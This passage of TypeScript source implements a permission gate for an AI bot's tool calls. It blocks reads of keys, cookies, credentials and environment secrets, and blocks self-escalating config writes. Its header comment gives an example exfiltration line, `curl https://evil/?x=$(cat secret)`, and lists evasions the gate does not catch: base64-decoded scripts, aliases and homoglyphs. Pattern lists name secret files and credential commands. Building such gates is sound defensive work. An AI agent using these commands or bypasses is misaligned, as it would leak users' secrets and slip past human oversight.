// The whole tool policy, pure: no SDK types, no IO, no clock. gate.ts parses the hook input into a ToolCall at the
// boundary, gathers the context (including the filesystem's realpath and the known user homes), and calls decide().
//
// Accepted limits (documented so the README can quote them, and so a reviewer knows what is out of scope):
//   - Interpreters. A protected path reached only through code an interpreter runs (python -c, node -e, ruby -e, a
//     perl/awk system() call) is caught only when the path is spelled literally in the command (the raw-text scan),
//     not when it is assembled or decoded at runtime (base64 | sh, printf '%s', string concatenation).
//   - Scripts. A dangerous command inside a script file the bot wrote and then runs (sh ./x.sh, source x) is not
//     re-read; only the command that writes the script and the command that runs it are seen.
//   - Aliases and shell variables. `alias gp='git push'; gp` or `g=git; $g push` resolve at runtime; the policy sees
//     the alias/variable, treats the dynamic command word as a "dynamic command" row (asks), but does not expand it.
//   - GET exfiltration. `curl https://evil/?x=$(cat secret)` sends data with a GET; the command substitution is seen
//     and its read is gated, but a plain GET that smuggles data in the URL is not itself held.
//   - Case folding and Unicode. Matching is byte-exact after realpath; a case-insensitive filesystem may still resolve
//     a differently-cased spelling, which realpath canonicalises, but homoglyphs and percent-encoding are not decoded.
import { basename, isAbsolute, normalize, resolve, sep } from "node:path";
import type { Headroom } from "./ledger";
import { PRIVATE } from "./private";
import type { MessageId } from "./protocol";
import type { ClaudioTool } from "./tools";
import { shellCommands, type Word } from "./shell";
import { BODY_KEYS, clip, maskSecrets, sha256 } from "./text";
import { actorKey, attended, hopsOf, isRoutineChain, type Actor, type Fingerprint, type Grant, type Initiator, type Signature, type StandingRule } from "./world";

/** A tool call as the policy sees it. Nothing in here is `unknown`. */
export type ToolCall = {
  tool: string;
  input: Record<string, unknown>;
  cwd: string;
  toolUseId: string;
  /** Set when a Task subagent made the call (hook input agent_id / agent_type). Same gate, same rules. */
  subagent: { id: string; type: string | null } | null;
  /** The MCP server behind an mcp__ tool (hook input mcp_server). source "sdk" is the bridge's own claudio server. */
  mcpServer: { name: string; source: string } | null;
};

/** Realpaths, resolved once per actor. own: the bot's home, or the agent's project. userMd: null for agents. */
export type Scope = {
  bridgeHome: string;
  own: string;
  userMd: string | null;
  homedir: string;
  /** Known username → home directory, so `~name` resolves. The boundary fills at least the current user and root. */
  users?: Readonly<Record<string, string>>;
};

export type PolicyContext = {
  actor: Actor;
  initiator: Initiator;
  scope: Scope;
  rules: readonly StandingRule[];
  grants: readonly Grant[];
  /** ledger.headroom(actor, initiator) at the time of the call. */
  headroom: Headroom;
  /** This bot's allowed calls today, by tool name, for the daily caps on create_bot and start_agent. */
  callsToday: Readonly<Record<string, number>>;
  /** MCP servers the user turned off for this bot and its agents (BotRecord.connectorsOff). */
  connectorsOff: readonly string[];
  now: string;
  /** Resolves symlinks in the longest existing prefix of an absolute path. Floors match on what a path really is. */
  realpath: (path: string) => string;
};

/**
 * pass: no opinion, the auto classifier decides as it would without the bridge (the hook returns {}).
 * allow: only a user's grant or Always does this; it skips the classifier. rule: the grant's fingerprint or the
 *   Always rule's signature.
 * ask: the call is denied with a "held for approval" reason and a permission card opens. Never SDK "ask" or "defer".
 *   offerAlways is false for rows too broad or too risky to carry an Always button (the card shows Once/Deny/Never).
 * deny: blocked. handOff asks the bot to hand the step back to the user (passwords, payments, 2FA).
 */
export type Decision =
  | { kind: "pass" }
  | { kind: "allow"; via: "grant" | "always"; rule: string; cardId: MessageId }
  | { kind: "deny"; via: DenyVia; rule: string; reason: string; handOff: boolean }
  | { kind: "ask"; rule: string; label: string; signature: Signature; always: string; offerAlways: boolean };

type DenyVia = "floor" | "initiator" | "limit" | "never" | "rule" | "malformed";

/** Allowed calls per bot per local day. Past these, a runaway chain stops making bots and agents. */
export const DAILY_CAPS: Readonly<Record<string, number>> = { mcp__claudio__create_bot: 5, mcp__claudio__start_agent: 20 };

/** The SDK's own plumbing. A subagent's tool calls are gated one by one; the spawn and the hand-back are not effects. */
const SDK_INTERNAL = new Set(["Agent", "SubagentHandback"]);

const PASS: Decision = { kind: "pass" };

/** One simple command of a Bash line, wrappers stripped, with the dirs it may run in and the paths it touches. */
type Part =
  | { kind: "bash"; words: string[]; verb: string; text: string; cwds: string[]; dynamicCmd: boolean; recursive: boolean; emptyDynamicRm: boolean; pushUntrusted: boolean; shellStdin: boolean; touches: Touch[] }
  | { kind: "call"; call: ToolCall; touches: Touch[] };

/** A path a call touches, as written (resolved against cwd and ~) and as it really is (symlinks resolved). */
type Touch = {
  lexical: string;
  real: string;
  /** Also a hit when it is an ancestor of a protected root (a recursive/reading verb, Grep/Glob, or a glob/$ word). */
  ancestorToo: boolean;
  /** The call writes this path (an output redirect, a writing verb, or a file-writing tool), for self-escalation. */
  write: boolean;
};

type View = { parts: Part[]; raw: string };

const isRecord = (v: unknown): v is Record<string, unknown> => typeof v === "object" && v !== null && !Array.isArray(v);

const claudio = (name: string) => `mcp__claudio__${name}`;
const isClaudio = (call: ToolCall) => call.tool.startsWith("mcp__claudio__") && (call.mcpServer?.source ?? "sdk") === "sdk";
const isConnector = (call: ToolCall) => call.tool.startsWith("mcp__") && !isClaudio(call);

/** snake_case, kebab-case and camelCase split into lowercase words. */
const wordsOf = (name: string) =>
  name
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toLowerCase()
    .split(/[^a-z0-9]+/)
    .filter(Boolean);

const mcpName = (tool: string) => tool.split("__").slice(1).join(" ");

const isDigits = (s: string) => /^\d+$/.test(s);
const stripScheme = (w: string) => w.replace(/^file:\/\/(localhost)?/, "");

/** Resolve ~, ~name, ~+, ~-, $HOME against the scope and the current directory. Unknown ~name is left unresolved. */
function expandHome(word: string, ctx: PolicyContext, dir: string): string {
  const home = ctx.scope.homedir;
  const w = word.replace(/\$\{HOME\}|\$HOME(?![A-Za-z0-9_])/g, home);
  if (w === "~" || w.startsWith("~/")) return home + w.slice(1);
  if (w === "~+" || w.startsWith("~+/")) return dir + w.slice(2);
  if (w === "~-" || w.startsWith("~-/")) return dir + w.slice(2);
  const m = w.match(/^~([A-Za-z0-9._-]+)(\/.*)?$/);
  if (m) {
    const h = userHome(m[1]!, ctx);
    if (h !== null) return h + (m[2] ?? "");
  }
  return w;
}

/** The home of a named user: the scope's table first, then the current user when the name matches the home's basename. */
function userHome(name: string, ctx: PolicyContext): string | null {
  const known = ctx.scope.users?.[name];
  if (known !== undefined) return known;
  if (name === basename(ctx.scope.homedir)) return ctx.scope.homedir;
  return null;
}

/** An absolute path with `..` left in place, so realpath resolves symlinks before `..` instead of after. */
const absRaw = (p: string, dir: string) => (isAbsolute(p) ? p : `${dir}${sep}${p}`);

/** Keys whose string values are paths, in any tool's input (built-in file tools and MCP filesystem servers alike). */
const PATH_KEY = /path|file|dir|folder|uri|url|location|^(cwd|src|source|dest|destination|target)$/i;
const looksPath = (v: string) => /^[~/]/.test(v) || v.startsWith("file://") || /\$\{?HOME\b/.test(v) || v.includes("/");

/** Every string in a tool's input that could name a path: keyed as a path, or shaped like one anywhere it appears. */
function inputPaths(value: unknown, key: string | null, out: string[]) {
  if (typeof value === "string") {
    if (key !== null && BODY_KEYS.has(key)) return; // a file body, not a path
    if (value.length > MAX_PATH_LEN) return; // no real path is this long, and scanning it is quadratic
    if (value !== "" && ((key !== null && PATH_KEY.test(key)) || looksPath(value))) out.push(value);
  } else if (Array.isArray(value)) {
    for (const v of value) inputPaths(v, key, out);
  } else if (isRecord(value)) {
    for (const [k, v] of Object.entries(value)) inputPaths(v, k, out);
  }
}

/**
 * Prefix words that run the command after them. Each lists the options that take a separate-word value, so the value is
 * not mistaken for the wrapped command. Long and short spellings both appear, since a long option's value is a word too
 * (`timeout --signal KILL`, `nice --adjustment 5`). zsh precommand modifiers (noglob, nocorrect) and coproc are here too.
 */
const WRAPPERS: Record<string, readonly string[]> = {
  env: ["-u", "--unset", "-C", "--chdir", "-S", "--split-string"],
  command: [],
  builtin: [],
  exec: ["-a"],
  nohup: [],
  time: [],
  nice: ["-n", "--adjustment"],
  arch: ["-arch"],
  xcrun: ["--sdk", "--toolchain"],
  stdbuf: ["-i", "-o", "-e"],
  setsid: [],
  ionice: ["-c", "-n"],
  noglob: [],
  nocorrect: [],
  coproc: [],
  npx: ["-p", "--package", "-c"],
  bunx: [],
  watch: ["-n", "--interval"],
  sudo: ["-u", "--user", "-g", "--group", "-h", "-p", "--prompt", "-C", "-D", "--chdir", "-r", "--role", "-t", "--type", "-U", "--other-user", "-T", "--command-timeout"],
  doas: ["-u", "-C"],
  xargs: ["-I", "-n", "--max-args", "-P", "--max-procs", "-L", "-d", "-E", "-s", "-a"],
  timeout: ["-s", "--signal", "-k", "--kill-after"],
  caffeinate: ["-t", "-w"],
  if: [],
  then: [],
  else: [],
  elif: [],
  do: [],
  while: [],
  until: [],
  "!": [],
  "{": [],
};
const SHELLS = new Set(["bash", "sh", "zsh", "dash", "ksh", "fish"]);
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/** The executable's name for matching rows: a leading zsh `=` stripped, the basename taken, lower-cased. */
const verbOf = (word: string) => basename(word.startsWith("=") ? word.slice(1) : word).toLowerCase();

/** What a wrapped segment really runs: a command, or a script handed to a shell. `chdir` is set by env -C/--chdir. */
type Unwrapped = ({ words: string[] } | { script: string }) & { chdir?: string };

/** The command a segment really runs, or a script it hands to a shell (bash -c, eval, env -S). Operates on de-quoted words. */
function unwrap(raw: string[]): Unwrapped {
  let words = raw;
  let chdir: string | undefined;
  for (;;) {
    while (words.length > 0 && ASSIGNMENT.test(words[0]!)) words = words.slice(1);
    const head = words[0] === undefined ? "" : verbOf(words[0]);
    if (head === "function") {
      // `function name { body; }`: drop the keyword and the name, leaving `{ body` for the `{` wrapper to strip.
      words = words.slice(1);
      if (words.length > 0 && !META.test(words[0]!) && words[0] !== "{") words = words.slice(1);
      continue;
    }
    const valued = WRAPPERS[head];
    if (valued !== undefined) {
      let i = 1;
      for (; i < words.length && (words[i]!.startsWith("-") || ASSIGNMENT.test(words[i]!)); i += valued.includes(words[i]!) ? 2 : 1) {
        // env -S / --split-string takes a whole script as its value; re-parse it rather than skip it.
        if (head === "env" && (words[i] === "-S" || words[i] === "--split-string") && words[i + 1] !== undefined) return { script: words[i + 1]!, chdir };
        const inline = words[i]!.match(/^-S(.+)$|^--split-string=(.*)$/s);
        if (head === "env" && inline) return { script: inline[1] ?? inline[2]!, chdir };
        if (head === "env" && (words[i] === "-C" || words[i] === "--chdir") && words[i + 1] !== undefined) chdir = words[i + 1];
        const c = words[i]!.match(/^(?:-C|--chdir)=(.*)$/s);
        if (head === "env" && c) chdir = c[1];
      }
      if (head === "timeout" && i < words.length) i++;
      // A bare `env` / `env -i` / `env A=1` with no command is an environment dump, not a wrapper; surface it.
      if (head === "env" && i >= words.length) return { words: ["env"], chdir };
      words = words.slice(i);
      continue;
    }
    if (head === "script") {
      // script [flags] <file> <command…>: skip flags, then the typescript file, then run the rest.
      let i = 1;
      while (i < words.length && words[i]!.startsWith("-")) i++;
      if (i < words.length) i++;
      words = words.slice(i);
      continue;
    }
    if (SHELLS.has(head)) {
      const flag = words.findIndex((w, i) => i > 0 && /^-[a-z]*c[a-z]*$/.test(w));
      if (flag !== -1) {
        let j = flag + 1;
        while (words[j] === "--") j++;
        if (words[j] !== undefined) return { script: words[j]!, chdir };
      }
    }
    if (head === "eval") return { script: words.slice(1).join(" "), chdir };
    return { words: words.length === 0 ? [] : [verbOf(words[0]!), ...words.slice(1)], chdir };
  }
}

const hasFlag = (words: string[], re: RegExp) => words.some((w) => w.startsWith("-") && re.test(w));
const RECURSIVE = (verb: string, words: Word[]) => {
  const texts = words.map((w) => w.text);
  // A brace-built flag (`rm {-r,-f}`, `rm -{r,f}`) hides the -r from a plain scan, so a brace word counts as possibly recursive.
  const braceFlag = words.some((w) => w.brace && /r/i.test(w.text) && /^-|,-|\{-/.test(w.text));
  return verb === "find" || verb === "rg" || verb === "ln" || verb === "ditto" || verb === "tar" ||
    (verb === "rm" && (braceFlag || hasFlag(texts, /^-[A-Za-z]*[rR]/) || texts.some((a) => /^--rec/.test(a)))) ||
    (verb === "grep" && (hasFlag(texts, /^-[A-Za-z]*[rR]/) || texts.includes("--recursive"))) ||
    (verb === "cp" && (hasFlag(texts, /^-[A-Za-z]*[aRr]/) || texts.some((w) => w === "--recursive" || w === "--archive"))) ||
    (verb === "zip" && hasFlag(texts, /^-[A-Za-z]*r/)) ||
    (verb === "rsync" && hasFlag(texts, /^-[A-Za-z]*[ar]/));
};
const WRITING = (verb: string, words: string[]) =>
  verb === "tee" || verb === "cp" || verb === "mv" || verb === "ln" || verb === "install" || verb === "ditto" || verb === "rsync" || verb === "dd" ||
  (verb === "sed" && hasFlag(words, /^-[A-Za-z]*i/)) || (verb === "perl" && hasFlag(words, /^-[A-Za-z]*i/));

/** A command word is a $PATH lookup, not a cwd-relative file, unless it is spelled as a path. */
const commandIsPath = (text: string) => text.startsWith("/") || text.startsWith("~") || text.startsWith("./") || text.startsWith("../");
const META = /[$`*?[{]/;
/** A path longer than any real filesystem path is a file body or a huge literal, not a path to resolve. */
const MAX_PATH_LEN = 4096;
/** A Bash command past this is held rather than parsed, so the synchronous hook cannot freeze the bridge. */
const MAX_BASH_LEN = 256 * 1024;

/** Replace $name / ${name} with a tracked literal assignment's value, so `d=.ssh; cat ~/$d/id_rsa` resolves. */
function substVars(text: string, vars: Record<string, string>): string {
  if (Object.keys(vars).length === 0 || !text.includes("$")) return text;
  return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (m, a: string, b: string) => vars[a ?? b] ?? m);
}

/**
 * One path a word names: tracked vars and `~`, `~name`, `~+`, `$HOME` are expanded first, then the path is cut at the
 * first metacharacter still unresolved ($VAR, a backtick, a glob). A word with a leftover metachar only knows the
 * directory above the metachar (cut back to the last `/`), which matches a protected root as an ancestor: the
 * glob could expand into the root. Empty prefixes resolve to nothing.
 */
function candidateTouch(raw: string, dir: string, ctx: PolicyContext, vars: Record<string, string>, ancestorAnyway: boolean, write: boolean): Touch | null {
  if (raw.length > MAX_PATH_LEN) return null;
  const expanded = expandHome(substVars(stripScheme(raw), vars), ctx, dir);
  const m = expanded.search(META);
  let cut = m === -1 ? expanded : expanded.slice(0, m);
  if (m !== -1) {
    // The metachar is unresolved, so only the directory above it is a known path; back up to the last `/`.
    const slash = cut.lastIndexOf("/");
    if (slash >= 0) cut = cut.slice(0, slash + 1);
  }
  if (cut === "" || isDigits(cut)) return null;
  const lexical = normalize(resolve(dir, cut));
  const real = normalize(ctx.realpath(absRaw(cut, dir)));
  return { lexical, real, ancestorToo: ancestorAnyway || m !== -1, write };
}

/** True when a recursive `rm` operand is a runtime command/variable expansion with no literal prefix: a `$(…)`, a
 *  backtick, or an unresolved `$var` (not a glob, which stays inside the working dir). We cannot tell what it deletes. */
const emptyDynamic = (w: Word, vars: Record<string, string>) => {
  if (!w.dynamic) return false;
  const t = substVars(w.text, vars);
  return t.startsWith("$") || t.startsWith("`");
};

/** The path touches of one simple command's words, resolved against every possible working dir. */
function touchesOf(words: Word[], verb: string, dirs: string[], ctx: PolicyContext, vars: Record<string, string>): Touch[] {
  const recursive = RECURSIVE(verb, words);
  const writing = WRITING(verb, words.map((w) => w.text));
  // grep/rg take a search pattern as their first operand; it is data, not a path to resolve.
  const patternAt = verb === "grep" || verb === "rg" ? words.findIndex((w, i) => i > 0 && !w.redirect && !w.text.startsWith("-")) : -1;
  const touches: Touch[] = [];
  const seen = new Set<string>();
  const add = (raw: string, write: boolean) => {
    for (const dir of dirs) {
      const key = `${write ? 1 : 0}|${dir}|${raw}`;
      if (seen.has(key)) continue;
      seen.add(key);
      const t = candidateTouch(raw, dir, ctx, vars, recursive, write);
      if (t) touches.push(t);
    }
  };
  let sawOperand = false;
  for (let n = 0; n < words.length; n++) {
    const w = words[n]!;
    if (n === 0 && !w.redirect && !commandIsPath(w.text)) continue;
    if (n === patternAt && !w.redirect) continue;
    const option = w.text.startsWith("-") && !w.redirect;
    const eq = w.text.indexOf("=");
    const candidates = option ? [] : [w.text];
    if (eq > 0) candidates.push(w.text.slice(eq + 1));
    for (const raw of candidates) {
      if (!option && n > 0) sawOperand = true;
      add(raw, w.redirectOut || writing);
    }
  }
  // A recursive verb with no path operand (grep -r x, find, rg foo) recurses from the working dir itself.
  if (recursive && !sawOperand) for (const dir of dirs) touches.push({ lexical: dir, real: dir, ancestorToo: true, write: writing });
  return touches;
}

/** The possible working dirs across a Bash line, as `cd`/`pushd`/`popd`/subshells/`env -C` move them, and the commands. */
function bashParts(command: string, cwd: string, ctx: PolicyContext): Part[] {
  const parts: Part[] = [];
  const home = ctx.scope.homedir;
  const start = ctx.realpath(cwd);
  const commands = shellCommands(command);
  const vars = collectVars(commands, ctx, start);
  if (!("TMPDIR" in vars)) vars.TMPDIR = process.env.TMPDIR ?? "/tmp"; // a known scratch root, so $TMPDIR/x resolves
  const addedRemotes = new Set<string>();

  // A set of possible cwds, over-approximated: `cd` keeps the old dirs as well as the new, so a conditional or failed cd
  // is still covered, and a dynamic or bare cd adds HOME. A subshell's cd is undone when it closes (restored by depth).
  let dirs = [start];
  let uncertain = false;
  let prev = [start];
  const pushdStack: string[][] = [];
  const saved: { depth: number; dirs: string[]; uncertain: boolean; prev: string[]; stack: string[][] }[] = [];
  let curDepth = 0;
  const cap = (xs: string[]) => (xs.length > 16 ? xs.slice(0, 16) : xs);
  const union = (a: string[], b: string[]) => cap([...new Set([...a, ...b])]);
  const resolveDir = (target: string, from: string) => ctx.realpath(absRaw(expandHome(substVars(target, vars), ctx, from), from));

  const emit = (words: Word[], depth: number, subshell: number): void => {
    const u = unwrap(words.map((w) => w.text));
    if ("script" in u) {
      if (depth >= 4) throw new Error("shell scripts nested too deep to read");
      for (const c of shellCommands(u.script)) emit(c.words, depth + 1, subshell);
      return;
    }
    if (u.words.length === 0) return;
    const effective = words.slice(words.length - u.words.length);
    const verb = verbOf(substVars(effective[0]?.text ?? u.words[0]!, vars));
    // A verb built at runtime (an unresolved $, substitution or glob anywhere in the first word) is a dynamic command;
    // `[` and `[[` are the test builtins, and a tracked assignment that resolves the whole verb is not dynamic.
    const dynamicCmd = verb !== "[" && verb !== "[[" && (effective[0]?.dynamic ?? false) && META.test(substVars(effective[0]!.text, vars));
    // env -C/--chdir runs just this command elsewhere; otherwise it runs in one of the possible cwds (plus HOME if uncertain).
    const here = u.chdir !== undefined ? dirs.map((d) => resolveDir(u.chdir!, d)) : uncertain ? union(dirs, [home]) : dirs;
    const nWords: string[] = [verb, ...u.words.slice(1).map((w) => substVars(w, vars))];
    // A push to a remote that is a URL, or one added or re-pointed on this same line, can exfiltrate the repo.
    let pushUntrusted = false;
    if (verb === "git") {
      const g = gitArgs(nWords);
      if (g?.sub === "remote" && (g.args[0] === "add" || g.args[0] === "set-url")) {
        const name = g.args.slice(1).find((a) => !a.startsWith("-"));
        if (name !== undefined) addedRemotes.add(name);
      }
      if (g?.sub === "push") {
        const remote = g.args.find((a) => !a.startsWith("-") && !a.startsWith("+"));
        pushUntrusted = remote !== undefined && (isGitUrl(remote) || addedRemotes.has(remote));
      }
    }
    // A surviving shell (sh/bash/zsh with its -c script already unwrapped away) runs piped or here-string/stdin input.
    const shellStdin = SHELLS.has(verb) && (effective.slice(1).some((w) => w.text === "-s") || !effective.slice(1).some((w) => !w.redirect && !w.text.startsWith("-")));
    parts.push({ kind: "bash", words: nWords, verb, text: nWords.join(" "), cwds: here, dynamicCmd, recursive: RECURSIVE(verb, effective), emptyDynamicRm: verb === "rm" && effective.some((w) => emptyDynamic(w, vars)), pushUntrusted, shellStdin, touches: touchesOf(effective, verb, here, ctx, vars) });
    if (verb === "find") {
      const i = effective.findIndex((w) => w.text === "-exec" || w.text === "-execdir");
      if (i !== -1) {
        const end = effective.findIndex((w, j) => j > i && (w.text === ";" || w.text === "+"));
        const sub = effective.slice(i + 1, end === -1 ? undefined : end).filter((w) => w.text !== "{}");
        if (sub.length > 0) emit(sub, depth + 1, subshell);
      }
    }
    if (verb === "osascript" && depth < 4) {
      // `osascript -e 'do shell script "…"'` runs a shell command; read it too.
      const m = effective.map((w) => w.text).join(" ").match(/do shell script\s+["']([^"']*)["']/i);
      if (m) for (const c of shellCommands(m[1]!)) emit(c.words, depth + 1, subshell);
    }
  };

  for (const c of commands) {
    // Entering a subshell saves the outer cwds; leaving it restores them, so a subshell's cd cannot leak outward.
    while (curDepth < c.subshell) {
      saved.push({ depth: curDepth, dirs, uncertain, prev, stack: pushdStack.slice() });
      curDepth++;
    }
    while (curDepth > c.subshell && saved.length > 0) {
      const s = saved.pop()!;
      ({ dirs, uncertain, prev } = s);
      pushdStack.length = 0;
      pushdStack.push(...s.stack);
      curDepth = s.depth;
    }
    emit(c.words, 0, c.subshell);
    const verb = verbOf(c.words[0]?.text ?? "");
    if (verb === "cd" || verb === "pushd" || verb === "popd") updateCwd(c, verb);
  }

  function updateCwd(c: { words: Word[]; cond: boolean }, verb: string) {
    const from = dirs[0] ?? home;
    const operand = c.words.find((w, i) => i > 0 && !w.text.startsWith("-"));
    const before = dirs;
    if (verb === "popd") {
      dirs = union(dirs, pushdStack.pop() ?? [home]);
    } else if (operand === undefined) {
      dirs = union(dirs, [home]); // bare `cd` / `pushd` goes to HOME
    } else if (operand.text === "-") {
      dirs = union(dirs, prev); // `cd -` returns to OLDPWD
    } else if (emptyDynamic(operand, vars)) {
      dirs = union(dirs, [home]); // a dynamic target could be anywhere; HOME is the common landing
      uncertain = true;
    } else {
      dirs = union(dirs, dirs.map((d) => resolveDir(operand.text, d)));
    }
    if (verb === "pushd") pushdStack.push(before);
    prev = before;
  }

  return parts;
}

/** Literal same-line assignments (`d=.ssh`, `h=$HOME`), expanded to an absolute value where one is known. */
function collectVars(commands: { words: Word[] }[], ctx: PolicyContext, dir: string): Record<string, string> {
  const vars: Record<string, string> = {};
  for (const c of commands)
    for (const w of c.words) {
      const m = w.text.match(/^([A-Za-z_][A-Za-z0-9_]*)=(.*)$/s);
      if (!m) break; // assignments only lead a command
      const value = expandHome(m[2]!, ctx, dir);
      if (!META.test(value)) vars[m[1]!] = value;
    }
  return vars;
}

/**
 * Hosts a Bash call asks the sandbox to let through beyond its allowlist (the tool's allowed_domains). The sandbox lets
 * them through once the call is allowed, so they are part of what the call does.
 */
function hostsOf(call: ToolCall): string[] {
  const hosts = call.tool === "Bash" ? call.input.allowed_domains : undefined;
  return Array.isArray(hosts) ? hosts.filter((h): h is string => typeof h === "string" && h.trim() !== "").map((h) => h.trim()).sort() : [];
}

function viewOf(call: ToolCall, ctx: PolicyContext): View {
  if (call.tool === "Bash") {
    const raw = String(call.input.command);
    // The hosts are a part of their own, so the table can hold them however harmless the command is.
    const hosts: Part[] = hostsOf(call).length > 0 ? [{ kind: "call", call, touches: [] }] : [];
    return { parts: [...bashParts(raw, call.cwd, ctx), ...hosts], raw };
  }
  const found: string[] = [];
  inputPaths(call.input, null, found);
  if (call.tool === "Glob" && typeof call.input.pattern === "string") found.push(call.input.pattern);
  const recursive = call.tool === "Grep" || call.tool === "Glob";
  if (found.length === 0 && !recursive) return { parts: [{ kind: "call", call, touches: [] }], raw: "" };
  const write = FILE_WRITES.has(call.tool);
  const dir = normalize(ctx.realpath(call.cwd));
  const touches = found.flatMap((raw) => candidateTouch(raw, dir, ctx, {}, recursive, write) ?? []);
  // Grep and Glob recurse from the working directory, so the directory itself is an ancestor touch they reach into.
  if (recursive) touches.push({ lexical: dir, real: dir, ancestorToo: true, write: false });
  return { parts: [{ kind: "call", call, touches }], raw: "" };
}

const under = (path: string, root: string) => path === root || path.startsWith(root.endsWith(sep) ? root : root + sep);
/** The touch hits the root: inside it, or (when the touch may span it) an ancestor of it, by lexical and real path. */
const hits = (t: Touch, rootLex: string, rootReal: string) =>
  under(t.lexical, rootLex) || under(t.real, rootReal) || (t.ancestorToo && (under(rootLex, t.lexical) || under(rootReal, t.real)));

type Floor = {
  id: string;
  label: string;
  /** Protected roots, as written; their realpaths are protected too. */
  roots: (ctx: PolicyContext) => string[];
  /** Realpaths inside the roots that stay allowed. */
  except?: (ctx: PolicyContext) => string[];
  /** A command that is itself forbidden, regardless of the paths it names (the `security` CLI, `ssh-add -L`). */
  bash?: (part: Extract<Part, { kind: "bash" }>) => boolean;
  connector?: (call: ToolCall) => boolean;
  /** A write to a config file the bridge itself loads (self-escalation), by its target path. */
  write?: (path: string, ctx: PolicyContext) => boolean;
  /** Scan the raw command text for the root spelled literally, to catch it inside an interpreter or a heredoc. */
  rawScan?: boolean;
  /** A forbidden command recognised from the raw Bash text (an env dump, a sensitive variable printed). */
  raw?: (parts: Extract<Part, { kind: "bash" }>[], ctx: PolicyContext) => boolean;
  handOff?: boolean;
};

const inHome = (...rels: string[]) => (ctx: PolicyContext) => rels.map((r) => resolve(ctx.scope.homedir, r));

/** Entering any of these is the user's job (handed off), read or write, by the tool name or an input field. */
const CREDENTIAL_WORDS = new Set(["password", "passwords", "passcode", "otp", "totp", "2fa", "mfa", "cvv", "cvc", "cardnumber"]);
/** A payment action is handed off only when it is a write (checkout, pay), never a read (get_purchase_quote). */
const PAYMENT_WORDS = new Set(["pay", "payment", "payments", "purchase", "checkout"]);

function keyWords(value: unknown, out: Set<string>) {
  if (Array.isArray(value)) for (const v of value) keyWords(v, out);
  else if (isRecord(value))
    for (const [k, v] of Object.entries(value)) {
      for (const w of wordsOf(k)) out.add(w);
      if (/card_?number|credit_?card/i.test(k)) out.add("cardnumber");
      keyWords(v, out);
    }
}

/** A connector tool that takes a credential (always), or carries out a payment (an action, not a read query). */
function handsOff(call: ToolCall): boolean {
  const name = new Set(wordsOf(call.tool.split("__").slice(2).join("_")));
  const fields = new Set<string>();
  keyWords(call.input, fields);
  if ([...CREDENTIAL_WORDS].some((w) => name.has(w) || fields.has(w))) return true;
  const read = [...name].some((w) => READ_VERBS.has(w));
  return !read && [...name].some((w) => PAYMENT_WORDS.has(w));
}

/** The names browsers and apps give cookie, login and key stores, matched by basename anywhere they are found. */
const SECRET_FILES = /^(Cookies|Login Data|Web Data|cookies\.sqlite|key4\.db|key3\.db|logins\.json|\.git-credentials|\.netrc)$|\.keychain-db$/;

/** The config files whose write would change how the bridge or git runs this bot (self-escalation). */
const ESCALATE = {
  bridgeLoaded(path: string, ctx: PolicyContext): boolean {
    const settings = /(^|\/)\.claude\/settings[^/]*$/.test(path);
    const mcp = /(^|\/)\.mcp\.json$/.test(path);
    const claudeHome = resolve(ctx.scope.homedir, ".claude");
    return (settings && (under(path, ctx.scope.own) || under(path, claudeHome))) || (mcp && under(path, ctx.scope.own));
  },
  config(path: string, ctx: PolicyContext): boolean {
    if (/(^|\/)\.claude\/settings[^/]*$/.test(path) || /(^|\/)\.mcp\.json$/.test(path)) return true;
    if (/(^|\/)\.git\/hooks\//.test(path) || /(^|\/)\.git\/config$/.test(path)) return true;
    if (/(^|\/)\.(zshrc|zprofile|bashrc|bash_profile|profile)$/.test(path)) return true;
    if (under(path, resolve(ctx.scope.homedir, "Library/LaunchAgents"))) return true;
    for (const d of ["hooks", "commands", "agents", "skills", "plugins"]) if (under(path, resolve(ctx.scope.homedir, ".claude", d))) return true;
    // Persistence vectors a committed repo or the home dir can carry: agent instructions and hook scripts.
    if (/(^|\/)(\.claude\/)?CLAUDE\.md$/.test(path)) return true;
    if (/(^|\/)\.claude\/(commands|agents|skills|hooks)\//.test(path)) return true;
    if (/(^|\/)\.(githooks|husky)(\/|$)/.test(path)) return true;
    if (/(^|\/)\.vscode\/tasks\.json$/.test(path)) return true;
    return false;
  },
};

/** Always denied, checked first, never liftable: no card is ever posted for these, so no rule or grant can name them. */
const FLOORS: readonly Floor[] = [
  {
    id: "floor.bridge",
    label: "ClaudioBot's own state, tokens and other bots' homes",
    roots: (ctx) => [ctx.scope.bridgeHome, ...inHome(...PRIVATE.bridge)(ctx)],
    except: (ctx) => (ctx.actor.kind === "bot" ? [ctx.scope.own, ...(ctx.scope.userMd === null ? [] : [ctx.scope.userMd])] : []),
  },
  {
    id: "floor.selfescalate",
    label: "a config file the bridge itself loads",
    roots: () => [],
    write: (path, ctx) => ESCALATE.bridgeLoaded(path, ctx),
  },
  {
    id: "floor.keys",
    label: "SSH, GPG and cloud keys or the Keychain",
    roots: inHome(...PRIVATE.keys),
    bash: (p) => p.verb === "security" || (p.verb === "ssh-add" && p.words.includes("-L")) || (p.verb === "gpg" && p.words.some((w) => w.includes("export-secret"))),
    rawScan: true,
  },
  {
    id: "floor.browser",
    label: "browser profiles and cookies",
    roots: inHome(...PRIVATE.browser),
    rawScan: true,
  },
  {
    id: "floor.secretfile",
    label: "a cookie, login or key store",
    roots: () => [],
    write: () => false,
  },
  {
    id: "floor.creds",
    label: "a stored credential or token",
    roots: inHome(...PRIVATE.creds),
    bash: (p) =>
      (p.verb === "gh" && p.words[1] === "auth" && (["token", "refresh"].includes(p.words[2] ?? "") || (p.words[2] === "status" && (p.words.includes("-t") || p.words.includes("--show-token"))))) ||
      (p.verb === "git" && (p.words[1] ?? "").startsWith("credential")) ||
      // Password managers and secret CLIs: reading an item prints the secret.
      p.verb === "op" || p.verb === "bw" || (p.verb === "pass" && (p.words.length === 1 || p.words.some((w, i) => i > 0 && !w.startsWith("-")))),
    rawScan: true,
  },
  {
    id: "floor.personal",
    label: "Messages, Mail, Contacts or Calendars",
    roots: inHome(...PRIVATE.personal),
    rawScan: true,
  },
  {
    id: "floor.env",
    label: "the bridge's own environment variables",
    roots: () => [],
    // A full env dump, or expanding a token/key variable, would leak the bridge's inherited secrets (CLAUDIOBOT_*, *_TOKEN).
    raw: (parts) => parts.some((p) => dumpsEnv(p) || p.text.match(SENSITIVE_ENV) !== null),
  },
